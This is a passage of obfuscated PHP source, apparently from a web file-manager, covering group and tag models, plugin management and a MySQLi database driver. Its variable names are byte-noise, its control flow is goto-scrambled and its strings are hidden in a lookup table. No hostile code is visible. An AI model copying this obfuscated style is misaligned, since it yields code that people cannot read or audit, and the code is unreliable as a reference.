$this->setNamePinyin($FŒŞÓù¢‰Û[$BÌµ“…Û‰è], $FŒŞÓù¢‰Û[$CÚâ™©¾—‹[28]]); goto f¶îÀ›‡¡; F·Ã¢âîù…: $cÜ‡¼’ˆ” = $FŒŞÓù¢‰Û; $E¸İò£¸²ù = array(); while ($cÜ‡¼’ˆ”[$CÚâ™©¾—‹[485]] != 0) { $E¸İò£¸²ù[] = $cÜ‡¼’ˆ”[$CÚâ™©¾—‹[485]]; $cÜ‡¼’ˆ” = $B¹îÀ“¯[$cÜ‡¼’ˆ”[$CÚâ™©¾—‹[485]]]; } goto FÈ±ôÍ½„¿; f¶îÀ›‡¡: $this->where(array($BÌµ“…Û‰è => $FŒŞÓù¢‰Û[$BÌµ“…Û‰è]))->save(array($CÚâ™©¾—‹[561] => $E¸İò£¸²ù)); goto FÂö•ÊŠñ; FÂö•ÊŠñ: } return $B¹îÀ“¯; } public function groupNameAuto($FØ—õòÔ’«, $a®Š†¯‡ø) { $Cì™ƒ¾Ã¥ =& $_SERVER[Šº]; $e³Õôİ…‘† = $this->where(array($Cì™ƒ¾Ã¥[402] => $FØ—õòÔ’«))->getField($Cì™ƒ¾Ã¥[28], !0); if (!$e³Õôİ…‘† || !in_array($a®Š†¯‡ø, $e³Õôİ…‘†)) { return $a®Š†¯‡ø; } for ($BšæôÃŒİã = 1; $BšæôÃŒİã <= count($e³Õôİ…‘†) + 1; $BšæôÃŒİã++) { $c«ïæ¸ã† = $a®Š†¯‡ø . "\50{$BšæôÃŒİã}\51"; if (!in_array($c«ïæ¸ã†, $e³Õôİ…‘†)) { return $c«ïæ¸ã†; } } } public function groupSwitch($aë‘¬À‹ö, $dßîƒ’‰“ó) { goto cŒ¼ĞÉÔÑ; cˆïè¬‚: $bç¹—¸ÛÛ³ = !empty($b•–ŞÜÕÂí[$aë‘¬À‹ö]) ? $b•–ŞÜÕÂí[$aë‘¬À‹ö] : !1; if ($bç¹—¸ÛÛ³) { goto E±Ùæ™¸ô; DÀ¯á®¸Û¹: $bò¢Ö£ö²À = array($bŞ´ÁÕ­“ò[491] => $dßîƒ’‰“ó); Model($bŞ´ÁÕ­“ò[1775])->where($BßåÂñœ«õ)->save($bò¢Ö£ö²À); Model($bŞ´ÁÕ­“ò[1776])->where($BßåÂñœ«õ)->save($bò¢Ö£ö²À); goto FñŠåÖÊŒ¥; E±Ùæ™¸ô: if (!$b•–ŞÜÕÂí[$dßîƒ’‰“ó]) { $b•–ŞÜÕÂí[$dßîƒ’‰“ó] = Model($bŞ´ÁÕ­“ò[788])->groupRootAdd($dßîƒ’‰“ó); } $d±î°ÆÀÂ = $b•–ŞÜÕÂí[$dßîƒ’‰“ó]; $BßåÂñœ«õ = array($bŞ´ÁÕ­“ò[485] => $bç¹—¸ÛÛ³); goto bö¾øÄÒõĞ; fÈ“ô­¨³Æ: foreach ($b•–ŞÜÕÂí as $AÙŸÃÀÓæ‘) { $A®ê××ĞÕš = $AÙŸÃÀÓæ‘[$bŞ´ÁÕ­“ò[410]] == $bŞ´ÁÕ­“ò[87] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($bŞ´ÁÕ­“ò[788])->move($AÙŸÃÀÓæ‘[$bŞ´ÁÕ­“ò[403]], $d±î°ÆÀÂ, $A®ê××ĞÕš); } Model($bŞ´ÁÕ­“ò[788])->moveClearAuth = !0; $BßåÂñœ«õ = array($bŞ´ÁÕ­“ò[411] => 2, $bŞ´ÁÕ­“ò[491] => $aë‘¬À‹ö); goto DÀ¯á®¸Û¹; bö¾øÄÒõĞ: $b•–ŞÜÕÂí = Model($bŞ´ÁÕ­“ò[788])->where($BßåÂñœ«õ)->field($bŞ´ÁÕ­“ò[1774])->select(); if (!$b•–ŞÜÕÂí) { $b•–ŞÜÕÂí = array(); } Model($bŞ´ÁÕ­“ò[788])->moveClearAuth = !1; goto fÈ“ô­¨³Æ; FñŠåÖÊŒ¥: } $this->_changeChildLevel($e¯’¦¼ÛÃ[$aë‘¬À‹ö], $e¯’¦¼ÛÃ[$dßîƒ’‰“ó], !0); goto Aõø£×ñá; Aõø£×ñá: $this->where(array($bŞ´ÁÕ­“ò[485] => $aë‘¬À‹ö))->save(array($bŞ´ÁÕ­“ò[485] => $dßîƒ’‰“ó)); return !0; goto b™á÷ÉîòŒ; e®óÊîùš¡: $BßåÂñœ«õ = array($bŞ´ÁÕ­“ò[411] => 2, $bŞ´ÁÕ­“ò[485] => 0, $bŞ´ÁÕ­“ò[410] => 1, $bŞ´ÁÕ­“ò[491] => array($bŞ´ÁÕ­“ò[7], array($aë‘¬À‹ö, $dßîƒ’‰“ó))); $b•–ŞÜÕÂí = Model($bŞ´ÁÕ­“ò[788])->where($BßåÂñœ«õ)->field($bŞ´ÁÕ­“ò[1773])->select(); $b•–ŞÜÕÂí = array_to_keyvalue($b•–ŞÜÕÂí, $bŞ´ÁÕ­“ò[491], $bŞ´ÁÕ­“ò[403]); goto cˆïè¬‚; cïÅôôí’Ş: $e¯’¦¼ÛÃ = array_to_keyvalue($e¯’¦¼ÛÃ, $bŞ´ÁÕ­“ò[1677]); if (!isset($e¯’¦¼ÛÃ[$aë‘¬À‹ö]) || !isset($e¯’¦¼ÛÃ[$dßîƒ’‰“ó]) || $e¯’¦¼ÛÃ[$aë‘¬À‹ö][$bŞ´ÁÕ­“ò[485]] == 0) { return !1; } $BßåÂñœ«õ = array($bŞ´ÁÕ­“ò[1677] => $aë‘¬À‹ö); goto bœƒİâŒ“; cŒ¼ĞÉÔÑ: $bŞ´ÁÕ­“ò =& $_SERVER[Šº]; $BßåÂñœ«õ = array($bŞ´ÁÕ­“ò[1677] => array($bŞ´ÁÕ­“ò[7], array($aë‘¬À‹ö, $dßîƒ’‰“ó))); $e¯’¦¼ÛÃ = $this->where($BßåÂñœ«õ)->select(); goto cïÅôôí’Ş; bœƒİâŒ“: $a¹„ƒ¸¢¹Š = Model($bŞ´ÁÕ­“ò[1758])->where($BßåÂñœ«õ)->select(); if (!$a¹„ƒ¸¢¹Š) { $a¹„ƒ¸¢¹Š = array(); } foreach ($a¹„ƒ¸¢¹Š as $C‘Åê¢£µ) { $A³†‰ÁÚøİ = $C‘Åê¢£µ[$bŞ´ÁÕ­“ò[1514]]; $BßåÂñœ«õ = array($bŞ´ÁÕ­“ò[1514] => $A³†‰ÁÚøİ, $bŞ´ÁÕ­“ò[1677] => $dßîƒ’‰“ó); $D®äÁåõ¾À = Model($bŞ´ÁÕ­“ò[1758])->where($BßåÂñœ«õ)->find(); if (!$D®äÁåõ¾À) { $eù†¹ÙÈæÆ = array($dßîƒ’‰“ó => $C‘Åê¢£µ[$bŞ´ÁÕ­“ò[1772]]); Model($bŞ´ÁÕ­“ò[514])->userGroupAdd($A³†‰ÁÚøİ, $eù†¹ÙÈæÆ); } Model($bŞ´ÁÕ­“ò[514])->userGroupRemove($A³†‰ÁÚøİ, $aë‘¬À‹ö); } goto e®óÊîùš¡; b™á÷ÉîòŒ: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\x5f\146\141\166"; protected function cacheFunctionAlias($f¢Ø´ÜÎß) { $dƒª²ë´ÀÑ =& $_SERVER[Šº]; return array($dƒª²ë´ÀÑ[1777] => array($f¢Ø´ÜÎß[0], $dƒª²ë´ÀÑ[1778]), $dƒª²ë´ÀÑ[1779] => array($f¢Ø´ÜÎß[0], $dƒª²ë´ÀÑ[1780])); } protected function get($Aˆ…¦“Œƒ§) { $c…ìàñáå =& $_SERVER[Šº]; $a¹ÏîùäÇé = Model($c…ìàñáå[493])->metaGet($Aˆ…¦“Œƒ§, $c…ìàñáå[1781]); $cÜ ¡‘Ç‚ñ = json_decode($a¹ÏîùäÇé, !0); return $cÜ ¡‘Ç‚ñ ? $cÜ ¡‘Ç‚ñ : array($c…ìàñáå[1782] => $c…ìàñáå[87], $c…ìàñáå[366] => array()); } protected function set($A¨Êœ–ªĞ, $AëÀ”İˆÖà) { $d˜ÉÑÓ»Ã´ =& $_SERVER[Šº]; $AëÀ”İˆÖà = $AëÀ”İˆÖà ? $AëÀ”İˆÖà : array($d˜ÉÑÓ»Ã´[1782] => $d˜ÉÑÓ»Ã´[87], $d˜ÉÑÓ»Ã´[366] => array()); Model($d˜ÉÑÓ»Ã´[493])->metaSet($A¨Êœ–ªĞ, $d˜ÉÑÓ»Ã´[1781], json_encode($AëÀ”İˆÖà)); return Model($d˜ÉÑÓ»Ã´[493])->metaSet($A¨Êœ–ªĞ, $d˜ÉÑÓ»Ã´[1781], json_encode($AëÀ”İˆÖà)); } protected function getByTagID($CÍŒæ¸„’, $E´ãò•Ôœ„) { goto bŸ­Å·Šİİ; B÷Â½ˆ˜…: return is_array($AïáÌÁÕíí) ? $AïáÌÁÕíí : !1; goto FëÀîËù‘Ô; bŸ­Å·Šİİ: $eŸ˜¿Óâ =& $_SERVER[Šº]; if (!$CÍŒæ¸„’ || !$E´ãò•Ôœ„) { return !1; } if (!Model($eŸ˜¿Óâ[493])->getInfoSimple($CÍŒæ¸„’)) { return !1; } goto fÕ¨éšëÁ; fÕ¨éšëÁ: $dÆ¢—Ç­èÔ = $this->get($CÍŒæ¸„’); if (!$dÆ¢—Ç­èÔ || !isset($dÆ¢—Ç­èÔ[$eŸ˜¿Óâ[366]])) { return !1; } $AïáÌÁÕíí = array_find_by_field($dÆ¢—Ç­èÔ[$eŸ˜¿Óâ[366]], $eŸ˜¿Óâ[392], $E´ãò•Ôœ„); goto B÷Â½ˆ˜…; FëÀîËù‘Ô: } public function listSource($côšŠÖä’¤, $b¯öñ×èÍ®) { goto AèğÖë‘£; aù Çšô: foreach ($dîÏâ²ç as $d‰¶Éâ => $C­½¤Íİôá) { $EßáºÅ‰¬ = !0; if (!$b¯öñ×èÍ®) { $aŠé–†ÌÛ–[] = $d‰¶Éâ; continue; } foreach ($b¯öñ×èÍ® as $DµïÍà‰åá) { if (!in_array($DµïÍà‰åá, $C­½¤Íİôá)) { $EßáºÅ‰¬ = !1; break; } } if ($EßáºÅ‰¬) { $aŠé–†ÌÛ–[] = $d‰¶Éâ; } } if (!$aŠé–†ÌÛ–) { return array(); } $BÈÏÓğ‡´‚ = Model($bÎì¹ê‚ [1192])->listSource(array($bÎì¹ê‚ [417] => array($bÎì¹ê‚ [418], $aŠé–†ÌÛ–))); goto AçÈÊ°‡ÅÕ; aËÁ¼òßµ: if ($Eî’•ğ´¸®) { $this->removeBySource($côšŠÖä’¤, $Eî’•ğ´¸®); } return $BÈÏÓğ‡´‚; goto C·²ôóœ¢ò; CÒ•° ˆ¤: $dîÏâ²ç = array(); foreach ($fÒ­©‰²ÆÏ as $dí¹–¤Ø•Ø) { $AñÊ²·×‹¾ = $dí¹–¤Ø•Ø[$bÎì¹ê‚ [76]]; if (!$AñÊ²·×‹¾) { continue; } if (!isset($dîÏâ²ç[$AñÊ²·×‹¾])) { $dîÏâ²ç[$AñÊ²·×‹¾] = array(); } $dîÏâ²ç[$AñÊ²·×‹¾][] = $dí¹–¤Ø•Ø[$bÎì¹ê‚ [426]]; } $aŠé–†ÌÛ– = array(); goto aù Çšô; Cõ„¼Şô¡™: $EÁœìèĞšä = array_to_keyvalue($BÈÏÓğ‡´‚[$bÎì¹ê‚ [74]], $bÎì¹ê‚ [33], $bÎì¹ê‚ [403]); $fĞ¿ÎêóŒî = array_merge($EÁœìèĞšä, $EôÌçê‰Õ); foreach ($aŠé–†ÌÛ– as $AñÊ²·×‹¾) { if (!in_array($AñÊ²·×‹¾, $fĞ¿ÎêóŒî)) { $Eî’•ğ´¸®[] = $AñÊ²·×‹¾; } } goto aËÁ¼òßµ; AçÈÊ°‡ÅÕ: if (!$BÈÏÓğ‡´‚ || count($aŠé–†ÌÛ–) == $BÈÏÓğ‡´‚[$bÎì¹ê‚ [363]][$bÎì¹ê‚ [364]]) { return $BÈÏÓğ‡´‚; } $Eî’•ğ´¸® = array(); $EôÌçê‰Õ = array_to_keyvalue($BÈÏÓğ‡´‚[$bÎì¹ê‚ [75]], $bÎì¹ê‚ [33], $bÎì¹ê‚ [403]); goto Cõ„¼Şô¡™; AèğÖë‘£: $bÎì¹ê‚  =& $_SERVER[Šº]; if ($b¯öñ×èÍ® && !is_array($b¯öñ×èÍ®)) { $b¯öñ×èÍ® = array($b¯öñ×èÍ®); } $fÒ­©‰²ÆÏ = $this->listData($côšŠÖä’¤); goto CÒ•° ˆ¤; C·²ôóœ¢ò: } protected function listData($AË¸äË•Š´) { $D÷¬ƒµ¶ºÊ =& $_SERVER[Šº]; $FÆ†Æ´ŠÂø = array($D÷¬ƒµ¶ºÊ[1506] => 0, $D÷¬ƒµ¶ºÊ[470] => array($D÷¬ƒµ¶ºÊ[1783], 0), $D÷¬ƒµ¶ºÊ[422] => $D÷¬ƒµ¶ºÊ[1784] . $AË¸äË•Š´); $E¶éö„–ùÀ = $D÷¬ƒµ¶ºÊ[1785]; $a£é±ÚÏËÁ = $this->field($E¶éö„–ùÀ)->where($FÆ†Æ´ŠÂø)->order($D÷¬ƒµ¶ºÊ[1786])->select(); return $a£é±ÚÏËÁ ? $a£é±ÚÏËÁ : array(); } protected function addToTag($d”µ¶¦¯¢ó, $bØ‚Í¨Õï, $B×É¸ˆÅâá) { $CŒŞÌÇç·Ì =& $_SERVER[Šº]; if (!$this->getByTagID($d”µ¶¦¯¢ó, $B×É¸ˆÅâá) || !$bØ‚Í¨Õï) { return !1; } if (!Model($CŒŞÌÇç·Ì[788])->pathInfo($bØ‚Í¨Õï)) { return !1; } $cÍ»Ù—óÖ = array($CŒŞÌÇç·Ì[1506] => 0, $CŒŞÌÇç·Ì[470] => $B×É¸ˆÅâá, $CŒŞÌÇç·Ì[421] => $bØ‚Í¨Õï, $CŒŞÌÇç·Ì[422] => $CŒŞÌÇç·Ì[1787] . $d”µ¶¦¯¢ó, $CŒŞÌÇç·Ì[420] => $CŒŞÌÇç·Ì[33], $CŒŞÌÇç·Ì[1681] => 0); if ($this->where($cÍ»Ù—óÖ)->find()) { return !1; } return $this->add($cÍ»Ù—óÖ); } protected function removeFromTag($AÙºñ¤‡Ã, $FŸëè³ò‚, $aÕˆâÀôãî) { $AÒçÍî‘–à =& $_SERVER[Šº]; if (!$this->getByTagID($AÙºñ¤‡Ã, $aÕˆâÀôãî) || !$FŸëè³ò‚) { return !1; } if (is_array($FŸëè³ò‚)) { $FŸëè³ò‚ = array($AÒçÍî‘–à[7], $FŸëè³ò‚); } $A¥‰”éÕŒ¸ = array($AÒçÍî‘–à[1506] => 0, $AÒçÍî‘–à[470] => $aÕˆâÀôãî, $AÒçÍî‘–à[422] => $AÒçÍî‘–à[1787] . $AÙºñ¤‡Ã, $AÒçÍî‘–à[421] => $FŸëè³ò‚); return $this->where($A¥‰”éÕŒ¸)->delete(); } protected function removeByTag($C›Ïä¦®ñ·, $AŒïØˆê¢¦) { $F˜ê„Œ§ŠÜ =& $_SERVER[Šº]; if (!$this->getByTagID($C›Ïä¦®ñ·, $AŒïØˆê¢¦)) { return !1; } $d« ¹¯¦É® = array($F˜ê„Œ§ŠÜ[1506] => 0, $F˜ê„Œ§ŠÜ[470] => $AŒïØˆê¢¦, $F˜ê„Œ§ŠÜ[422] => $F˜ê„Œ§ŠÜ[1787] . $C›Ïä¦®ñ·); return $this->where($d« ¹¯¦É®)->delete(); } protected function removeBySource($aÙ®‚íôÒ, $b’ô¼õàò³) { $b Û¢ˆ„Œ =& $_SERVER[Šº]; if (!$aÙ®‚íôÒ || !$b’ô¼õàò³) { return !1; } if (is_array($b’ô¼õàò³)) { $b’ô¼õàò³ = array($b Û¢ˆ„Œ[7], $b’ô¼õàò³); } $DÇŞš™Ú„Ê = array($b Û¢ˆ„Œ[1506] => 0, $b Û¢ˆ„Œ[421] => $b’ô¼õàò³, $b Û¢ˆ„Œ[470] => array($b Û¢ˆ„Œ[959], 0), $b Û¢ˆ„Œ[422] => $b Û¢ˆ„Œ[1787] . $aÙ®‚íôÒ); return $this->where($DÇŞš™Ú„Ê)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\145\155\56\x70\x6c\165\x67\151\x6e\114\x69\163\x74"; public $field = array("\156\x61\155\145", "\163\x74\141\x74\165\163", "\162\x65\147\151\x65\163\x74", "\x63\157\156\146\151\147"); public function loadList($DïÏÃ´©å = false) { $B»¾ïòèº” = array_to_keyvalue($this->listData(), $_SERVER[Šº][28]); if ($DïÏÃ´©å) { return $B»¾ïòèº”[$DïÏÃ´©å]; } return $B»¾ïòèº”; } public function init() { $eÍğãéµ‹¿ =& $_SERVER[Šº]; Hook::trigger($eÍğãéµ‹¿[1788]); $Eó¢ËÉäÃù = $this->loadPluginList(); foreach ($Eó¢ËÉäÃù as $F½ª«¾éğ‡ => $fÆŞÉÊŸ›¾) { $A¥ÉšêºÅ = $this->appAllow($F½ª«¾éğ‡, $fÆŞÉÊŸ›¾); if (!$A¥ÉšêºÅ) { continue; } foreach ($fÆŞÉÊŸ›¾[$eÍğãéµ‹¿[1789]] as $f˜¸İ®¸¼ã => $e±Ô©Õ¿Ÿ) { Hook::bind($f˜¸İ®¸¼ã, $e±Ô©Õ¿Ÿ); } } Hook::trigger($eÍğãéµ‹¿[1790]); Hook::trigger(ACTION); } public function appAllow($Fš›²›Í„ƒ, $b…ÜÚõ‘¦®, $CÖ…î„•éÈ = true) { $EáÏæì¬“ =& $_SERVER[Šº]; $BªšŸ•Üöƒ = PLUGIN_DIR . $Fš›²›Í„ƒ . $EáÏæì¬“[1791]; if (!is_array($b…ÜÚõ‘¦®) || !is_array($b…ÜÚõ‘¦®[$EáÏæì¬“[1789]]) || $b…ÜÚõ‘¦®[$EáÏæì¬“[711]] != 1 || !is_file($BªšŸ•Üöƒ)) { return !1; } if ($GLOBALS[$EáÏæì¬“[492]] == 1) { return !0; } if ($CÖ…î„•éÈ && !Action($EáÏæì¬“[1792])->checkAuth($Fš›²›Í„ƒ)) { return !1; } return !0; } public function unInstall($cæÜ§¢øğÏ) { $eÏ×ëáÌ =& $_SERVER[Šº]; $CïÑ†Õ¥â• = $this->loadList($cæÜ§¢øğÏ); if (file_exists(PLUGIN_DIR . $cæÜ§¢øğÏ)) { Hook::apply($cæÜ§¢øğÏ . $eÏ×ëáÌ[1793]); } $this->remove($CïÑ†Õ¥â•[$eÏ×ëáÌ[392]]); } public function changeStatus($A–ÏóÓƒ¬, $f¦™ÈÈªØ¿) { $EÇÁª²ÇÇ =& $_SERVER[Šº]; $Bº«ìÓ‘Š = $this->loadList($A–ÏóÓƒ¬); if ($f¦™ÈÈªØ¿) { Hook::apply($A–ÏóÓƒ¬ . $EÇÁª²ÇÇ[1794]); } $this->update($Bº«ìÓ‘Š[$EÇÁª²ÇÇ[392]], array($EÇÁª²ÇÇ[1795] => $f¦™ÈÈªØ¿)); } public function appRegist($EƒˆÜ”µí, $BñàîŞÏ§Â) { $F¿ñôÊ“§‘ =& $_SERVER[Šº]; $f«™«é™Ê® = $this->loadList($EƒˆÜ”µí); if ($f«™«é™Ê®) { $this->update($f«™«é™Ê®[$F¿ñôÊ“§‘[392]], array($F¿ñôÊ“§‘[1789] => $BñàîŞÏ§Â)); } else { $eŠº¸µÃ¾ = array($F¿ñôÊ“§‘[28] => $EƒˆÜ”µí, $F¿ñôÊ“§‘[1789] => $BñàîŞÏ§Â, $F¿ñôÊ“§‘[711] => 0, $F¿ñôÊ“§‘[6] => $this->getConfigDefault($EƒˆÜ”µí)); $this->insert($eŠº¸µÃ¾); } } public function getConfigDefault($BÅîš¦µöœ) { $F‘‘„‚áÚ± =& $_SERVER[Šº]; $d„èä­Êßˆ = array(); $eÇç…×œÈ = $this->getPackageJson($BÅîš¦µöœ); if (!$eÇç…×œÈ && is_array($eÇç…×œÈ[$F‘‘„‚áÚ±[1796]])) { return $d„èä­Êßˆ; } foreach ($eÇç…×œÈ[$F‘‘„‚áÚ±[1796]] as $C˜¼øµñÊ => $AéÎò²†‚Ò) { if (!isset($AéÎò²†‚Ò[$F‘‘„‚áÚ±[371]]) || isset($d„èä­Êßˆ[$C˜¼øµñÊ])) { continue; } $d„èä­Êßˆ[$C˜¼øµñÊ] = $AéÎò²†‚Ò[$F‘‘„‚áÚ±[371]]; } return $d„èä­Êßˆ; } public function getPackageJson($F’ÁÎ¡¸¾) { return Hook::apply($F’ÁÎ¡¸¾ . $_SERVER[Šº][1797]); } public function getConfig($Bâ¢ËµÚìÑ, $aãÛ™ÅÜ‘ = false) { $D›Ÿé—ƒĞ„ =& $_SERVER[Šº]; $A„¦”Ö³— = array(); $Bå«‚ĞŠƒ = $this->loadList($Bâ¢ËµÚìÑ); if ($Bå«‚ĞŠƒ && is_array($Bå«‚ĞŠƒ[$D›Ÿé—ƒĞ„[6]])) { $A„¦”Ö³— = $Bå«‚ĞŠƒ[$D›Ÿé—ƒĞ„[6]]; } if (!$A„¦”Ö³— || $aãÛ™ÅÜ‘) { $A„¦”Ö³— = $this->getConfigDefault($Bâ¢ËµÚìÑ); } return $A„¦”Ö³—; } public function setConfig($bñ·ó‡Û¯, $d¼Úœ¤—ƒ = false) { goto Cï‡ÛÈ³; C…Ÿ§¡ï¡‰: $this->update($dİ¢Á‹…Ò’[$fÊ­¾ô®²Ù[392]], array($fÊ­¾ô®²Ù[6] => $fÚã›±ßÎê)); goto A½ïË·Ãß; b½À¡”Ó‹¯: $fÚã›±ßÎê = $dİ¢Á‹…Ò’[$fÊ­¾ô®²Ù[6]]; if ($d¼Úœ¤—ƒ == !1) { $fÚã›±ßÎê = array(); $d¼Úœ¤—ƒ = $this->getConfigDefault($bñ·ó‡Û¯); } foreach ($d¼Úœ¤—ƒ as $FÙ·™î => $AÛÛ´¢İÔ) { $fÚã›±ßÎê[$FÙ·™î] = is_string($AÛÛ´¢İÔ) ? trim($AÛÛ´¢İÔ) : $AÛÛ´¢İÔ; } goto C…Ÿ§¡ï¡‰; Cï‡ÛÈ³: $fÊ­¾ô®²Ù =& $_SERVER[Šº]; $dİ¢Á‹…Ò’ = $this->loadList($bñ·ó‡Û¯); if (!$dİ¢Á‹…Ò’) { return !1; } goto b½À¡”Ó‹¯; A½ïË·Ãß: } public function viewList() { goto d†›Ôµ²ëµ; cÚ—¦‹Éõ: return $BÅõ´¿·¦ë; goto aŞÙ ƒ“´µ; d†›Ôµ²ëµ: $E§Ë©äÈƒ =& $_SERVER[Šº]; $FìåÅãˆÇæ = $this->loadList(); $this->pluginScan($FìåÅãˆÇæ); goto aÁ¿—ÙòÀö; aÁ¿—ÙòÀö: $FìåÅãˆÇæ = $this->loadPluginList(); $BÅõ´¿·¦ë = array(); foreach ($FìåÅãˆÇæ as $B¥¥Ò½¦ïÚ => $a©²ÒÏ‰ö) { unset($a©²ÒÏ‰ö[$E§Ë©äÈƒ[1789]], $a©²ÒÏ‰ö[$E§Ë©äÈƒ[6]]); $cÇÙª’Ğí = PLUGIN_DIR . $a©²ÒÏ‰ö[$E§Ë©äÈƒ[28]] . $E§Ë©äÈƒ[1791]; if (!is_file($cÇÙª’Ğí)) { continue; } $F¯¼®Ò•¤¹ = Hook::apply($a©²ÒÏ‰ö[$E§Ë©äÈƒ[28]] . $E§Ë©äÈƒ[1797]); if (is_array($F¯¼®Ò•¤¹)) { $BÅõ´¿·¦ë[$B¥¥Ò½¦ïÚ] = array_merge($a©²ÒÏ‰ö, $F¯¼®Ò•¤¹); } } goto cÚ—¦‹Éõ; aŞÙ ƒ“´µ: } private function loadPluginList() { $a½è“–£…á =& $_SERVER[Šº]; $DÑµ©Ûí££ = $this->loadList(); if (strtolower(MOD) == $a½è“–£…á[1798]) { return $DÑµ©Ûí££; } $e¦ˆÅø™¢“ = Hook::trigger($a½è“–£…á[1799], $DÑµ©Ûí££); if ($DÑµ©Ûí££ && !$e¦ˆÅø™¢“) { die; } return $e¦ˆÅø™¢“ ? $e¦ˆÅø™¢“ : $DÑµ©Ûí££; } private function pluginScan($B¸Ã‡«İ‡ê) { $F¼‘÷Ö ¡˜ =& $_SERVER[Šº]; recursion_dir(PLUGIN_DIR, $bÂ˜¬Õ•­î, $F§ˆÆ¶Š¤, 0); foreach ($bÂ˜¬Õ•­î as $aâ…‚ê‘İÒ) { $dâßå«ÊÚ = get_path_this($aâ…‚ê‘İÒ); if (isset($B¸Ã‡«İ‡ê[$dâßå«ÊÚ]) || !file_exists($aâ…‚ê‘İÒ . $F¼‘÷Ö ¡˜[1800]) || !file_exists($aâ…‚ê‘İÒ . $F¼‘÷Ö ¡˜[1791])) { continue; } Hook::apply($dâßå«ÊÚ . $F¼‘÷Ö ¡˜[1794]); } } } goto BÛÒÙÅòÖŸ; B­ŞŒæˆä‹: class DbMysqli extends Db { public function __construct($Eµ÷Ä©Œƒ  = '') { $D°ìÛ ¶Õ‚ =& $_SERVER[Šº]; if (!extension_loaded($D°ìÛ ¶Õ‚[756])) { think_exception(think_lang($D°ìÛ ¶Õ‚[10]) . $D°ìÛ ¶Õ‚[860]); } if (!empty($Eµ÷Ä©Œƒ )) { $this->config = $Eµ÷Ä©Œƒ ; if (empty($this->config[$D°ìÛ ¶Õ‚[13]])) { $this->config[$D°ìÛ ¶Õ‚[13]] = $D°ìÛ ¶Õ‚[33]; } } } public function connect($D‰ÅåÍÎ­ = '', $Båù·©ãæ = 0) { $Aäßø‡ß =& $_SERVER[Šº]; if (!isset($this->linkID[$Båù·©ãæ])) { goto F½Ôä÷Çé—; CˆğÖº»‹: $E¹¦ºáÇ• = $this->linkID[$Båù·©ãæ]->server_version; $this->linkID[$Båù·©ãæ]->query($Aäßø‡ß[838] . think_config($Aäßø‡ß[839]) . $Aäßø‡ß[55]); if ($E¹¦ºáÇ• > $Aäßø‡ß[840]) { $this->linkID[$Båù·©ãæ]->query($Aäßø‡ß[841]); } goto AÈ«éÇ†Ü ; F½Ôä÷Çé—: if (empty($D‰ÅåÍÎ­)) { $D‰ÅåÍÎ­ = $this->config; } $this->linkID[$Båù·©ãæ] = new mysqli($D‰ÅåÍÎ­[$Aäßø‡ß[834]], $D‰ÅåÍÎ­[$Aäßø‡ß[836]], $D‰ÅåÍÎ­[$Aäßø‡ß[837]], $D‰ÅåÍÎ­[$Aäßø‡ß[17]], $D‰ÅåÍÎ­[$Aäßø‡ß[835]] ? intval($D‰ÅåÍÎ­[$Aäßø‡ß[835]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto CˆğÖº»‹; AÈ«éÇ†Ü : $this->connected = !0; if (1 != think_config($Aäßø‡ß[18])) { unset($this->config); } goto Aªâõ‹‹ËÈ; Aªâõ‹‹ËÈ: } return $this->linkID[$Båù·©ãæ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bˆïÁç©À) { goto c†›’ôÌãñ; EÔ‹ÅÍÑ°: think_status($FÉŠ³¸…šÁ[20]); $this->queryID = $this->_linkID->query($bˆïÁç©À); if ($this->_linkID->more_results()) { while (($BÀªÍ‚ºöÊ = $this->_linkID->next_result()) != NULL) { $BÀªÍ‚ºöÊ->free_result(); } } goto D´‘«Ä×ò; Cßœç¡¥È: $this->queryStr = $bˆïÁç©À; if ($this->queryID) { $this->free(); } think_action_status($FÉŠ³¸…šÁ[19], 1); goto EÔ‹ÅÍÑ°; D´‘«Ä×ò: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto B˜…¨˜à; c†›’ôÌãñ: $FÉŠ³¸…šÁ =& $_SERVER[Šº]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto Cßœç¡¥È; B˜…¨˜à: } public function execute($dµÚ·…‡ºó) { goto cˆ¥¦İî§ç; d‰Ö«“ÄñÅ: if (!1 === $c¹•„©Â§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto C¬×Û–ÆÖ; E³“µ±“«: $this->queryStr = $dµÚ·…‡ºó; if ($this->queryID) { $this->free(); } think_action_status($dË½ŠÉà¡¢[21], 1); goto F¢Á™«—Õ¿; F¢Á™«—Õ¿: think_status($dË½ŠÉà¡¢[20]); $c¹•„©Â§ = $this->_linkID->query($dµÚ·…‡ºó); $this->debug(); goto d‰Ö«“ÄñÅ; cˆ¥¦İî§ç: $dË½ŠÉà¡¢ =& $_SERVER[Šº]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E³“µ±“«; C¬×Û–ÆÖ: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $DÜÆğ Ÿ¨  = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$DÜÆğ Ÿ¨ ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $cÂ‡†ßÁÀÛ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$cÂ‡†ßÁÀÛ) { $this->error(); return !1; } } return !0; } private function getAll() { $D‘Ë‰šª¹å = array(); if ($this->numRows > 0) { for ($d‰¿Á×¼İµ = 0; $d‰¿Á×¼İµ < $this->numRows; $d‰¿Á×¼İµ++) { $D‘Ë‰šª¹å[$d‰¿Á×¼İµ] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $D‘Ë‰šª¹å; } public function getFields($a§Úã²÷†Ä) { $FÚ¦îİÏïÌ =& $_SERVER[Šº]; $B´Î©óÊå = $this->query($FÚ¦îİÏïÌ[845] . $this->parseKey($a§Úã²÷†Ä)); $f×³Ÿƒğœ° = array(); if ($B´Î©óÊå) { foreach ($B´Î©óÊå as $bÕ”Ê‘¥¯Ã => 